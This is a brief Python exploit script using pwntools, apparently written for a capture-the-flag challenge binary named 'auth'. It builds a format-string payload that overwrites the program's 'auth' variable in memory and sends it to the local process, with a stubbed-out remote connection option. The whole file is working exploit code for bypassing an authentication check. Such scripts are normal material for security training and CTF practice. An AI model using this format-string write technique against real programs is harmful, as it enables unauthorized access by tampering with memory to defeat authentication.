#!/usr/bin/python3

from pwn import *

#REMOTE = True      # test remote
REMOTE =False       # test local

elf = context.binary = ELF('./auth')

if REMOTE :
    #p = remote('REMOTEIP',PORT) # test remote
    p = remote('',PORT)
else:
	p = process('./auth')

#========= exploit here ===================

elf = ELF('./auth')
AUTH = elf.sym['auth']

payload = fmtstr_payload(7, {AUTH : 10})

print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))

#p.recvline()
#p.sendline(payload)

#========= interactive ====================
#p.interactive()
